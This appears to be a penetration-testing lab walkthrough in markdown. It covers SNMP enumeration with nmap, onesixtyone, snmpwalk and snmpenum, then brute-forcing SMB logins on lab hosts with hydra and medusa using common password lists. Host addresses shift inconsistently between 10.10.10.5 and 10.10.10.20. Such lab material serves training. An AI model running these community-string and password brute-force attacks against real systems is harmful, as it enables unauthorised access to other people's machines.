# SNMP Enumeration 
---
## Check for open ports

```bash
nmap -sU -p 161 10.10.10.5,20
```

---

## Find the community name of the host running SNMP

Firstly, we need to discover what are the communities in use by this service.

We are going to use **onesixtyone** in order to brute-force the community name against the host 10.10.10.5. So onesixtyone will use a list of predefined potential community names (file named dict.txt) that come with the tool in order to try to guess which one is in use by the system 10.10.10.5.

```bash
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.5
```

>💡 Note: If onesixtyone doesn't work in your attacking machine, please try the below.

```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.10.10.5
```

Another useful tool that we can use to check if SNMP is really running in a remote host, and also to gather more information, is snmpwalk. Let's run snmpwalk against 10.10.10.20 and check the results:

```bash
snmpwalk -v 1 -c public 10.10.10.5
```

---

## Gather as much as information you can via SNMP

We already know a host which is running SNMP and also its community name. As a next step, let's try to use this information to gather extra information.

We are going to use a tool named snmpenum, snmpenum, uses a database of OIDs to request specific information via SNMP. It comes with 3 different databases, stored in files:

> Note: You might have some problems running some of the previous databases. Most likely the issue is related to a bad file format between Windows and Linux. Run the following command to fix this kind of error:

```bash
root@kali:~/tools/snmp# dos2unix *.txt
```

> Depending on the system you are dealing with, you'll need to use different OID to get specific information, such as processes running, hostnames, etc. As we already discovered that 10.10.10.20 is a Windows machine, let's use snmpenum with the windows database file (windows.txt):

```bash
perl snmpenum.pl 10.10.10.5 public windows.txt
```

> Note: Please find below an alternative way to find valid users and information in general:

```bash
nmap -sU -p 161 --script snmp-win32-users 10.10.10.5
```

```bash
nmap -sU -p 161 --script snmp-* 10.10.10.5 -oG snmp.txt
```

From the list of information retrieved, we found a couple of interesting data, such as: running processes, users, services, installed applications, etc. It must be noted that the same results can be achieved using snmpcheck. Furthermore, the previous tool was much more detailed.

---
## Brute-force the SMB host

First of all, let's save the usernames to brute-force in a file:

```bash
root@kali:~/LABS/13# echo -e "admin\\nAdministrator\\nGuest " > users.txt
```

To continue, we need to review carefully the results of task2. Note that all TCP ports on 10.10.10.5 are closed, this means that it is really a remote possibility of getting a shell on that host, which has just a few UDP ports open and allowing incoming traffic.

If we review the results for the host 10.10.10.20 the situation is a little bit better, the SMB ports are open (ports 139 and 445)

Then, let's try to use hydra to perform a brute force attack against 10.10.10.20 using the SMB protocol. We might be lucky since most users out there reuse usernames and passwords in different systems across the network.

```bash
hydra -L users.txt -P /usr/share/john/password.lst 10.10.10.20 smb -f -V
or
medusa -h 10.10.10.20 -u admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt -f -t 50
```
